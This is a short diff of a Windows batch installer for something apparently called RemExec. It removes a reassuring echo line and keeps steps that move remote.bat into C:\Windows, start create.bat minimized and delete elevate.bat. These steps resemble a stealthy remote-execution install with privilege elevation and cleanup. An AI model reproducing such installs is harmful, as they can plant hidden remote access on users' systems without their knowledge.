@@ -55,7 +55,6 @@ set "dir=%cd%"
     if %errorLevel% == 0 (
       cd %localappdata%\Programs\RemExec
       del /Y C:\Windows\remote.bat
-      echo /\ Don't worry! Is a app-file
       move /Y remote.bat "C:\Windows"
       start /min create.bat
       del /q elevate.bat
